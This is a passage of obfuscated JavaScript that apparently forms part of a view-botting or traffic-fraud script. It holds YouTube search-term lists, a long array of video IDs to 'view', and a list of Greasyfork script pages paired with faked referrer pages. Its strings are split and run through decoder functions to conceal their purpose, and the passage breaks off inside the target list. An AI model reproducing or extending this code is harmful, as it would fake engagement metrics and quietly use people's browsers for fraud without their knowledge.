searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push']((Y(0x21) + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x90e + -0x3 * 0x435 + 0x39b)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xeee + 0xa2 * -0x7 + -0xa76)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + Z(0x8, 'KVFu') + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x32b + 0x1 * -0x1ff5 + 0x1ccd * 0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    Y(0x13) + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    Y(0x1e) + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    a0(0x2) + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    Y(0x1) + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + Z(0x19, 'e!zL') + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0x0) + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0xb) + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Y(0x6) + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + Z(0x22, 'QeHh') + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
